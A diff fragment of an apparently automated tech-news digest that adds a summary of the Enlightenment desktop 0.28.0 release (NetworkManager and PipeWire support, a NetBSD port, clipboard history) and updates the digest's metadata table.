+Carsten Haitzler's release notes for **0.28.0** (2026-10-31) are a long list of infrastructure catching up rather than a new shell. Networking is the largest block: initial **NetBSD support** including power commands and signal handling; a **NetworkManager module** covering Wi-Fi, Ethernet, Bluetooth and VPN; automatic detection between NetworkManager and ConnMan; signal-strength and security indicators; saved-connection management with forget buttons; VPN import with username prompts and remembered form fields; connectivity callbacks and captive-portal login-URL refresh handling. Audio gains **native PipeWire mixer support alongside PulseAudio**, with mixer actions to select outputs and cycle sinks.
+
+The rest is the kind of thing a desktop shell accretes: an integrated **clipboard history** module with configurable persistent history and individually removable entries, the **Pants** module restored with skirts, kilts and lederhosen, battery charge limits remembered per battery, ACPI CPU power-profile support, AMD GPU power settings matched to CPU power levels, and a batch of NetworkManager memory-safety, D-Bus lifecycle and shutdown-race fixes.
+
+**Why it matters:** a compositor-adjacent desktop that once shipped its own network stack is now delegating to NetworkManager and PipeWire — the same consolidation that has been happening above it — and that is what makes a NetBSD port tractable at all, since both are portable services rather than kernel interfaces. The theme of the release is unglamorous and correct: fewer bespoke daemons, more of the platform's own plumbing, and the bugs that come with somebody else's lifecycle.
+
+[`🔗 Enlightenment 0.28.0 release notes`](https://www.enlightenment.org/news/2026-10-31-enlightenment-0.28.0) · [`🔗 Enlightenment/efl (pushed 2026-11-02)`](https://github.com/Enlightenment/efl) · [`🔗 HN thread`](https://news.ycombinator.com/item?id=50326530)
+
+---
+
 ## Metadata
 
 | Field | Value |
 |-------|-------|
-| Generated | 2026-11-03T04:25:33Z |
-| Items | 31 |
+| Generated | 2026-11-03T12:22:14Z |
+| Items | 47 |
 | Sources tracked | 22 (Hacker News, GitHub Trending, arXiv, NVD, cveawg, vendor blogs, security advisories) |
 | Update schedule | 04:03, 12:03, 20:03 UTC+8 (3x daily) |
 | Ranking | Velocity-weighted (recency × engagement acceleration × source authority) |
